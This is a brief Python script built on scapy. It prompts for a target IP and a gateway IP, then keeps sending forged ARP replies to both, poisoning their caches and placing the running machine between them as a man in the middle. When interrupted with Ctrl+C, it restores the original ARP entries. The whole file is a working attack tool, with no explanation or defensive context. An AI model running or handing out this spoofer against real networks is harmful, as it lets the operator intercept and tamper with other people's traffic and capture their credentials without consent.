#!/usr/bin/ python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, source_ip):
    print("[+] Restoring Defaults ...")
    destination_mac = get_mac(dest_ip)
    source_mac = get_mac((source_ip))
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


sent_packets_count = 0
target_ip = input("Enter Target IP :")
gateway_ip = input("Enter Gateway IP:")

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count= sent_packets_count+2;
        print("\r[+] Packets Sent "+str(sent_packets_count),end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip,gateway_ip)
    print("\n[+] Detected Ctrl+c .... Quitting!")

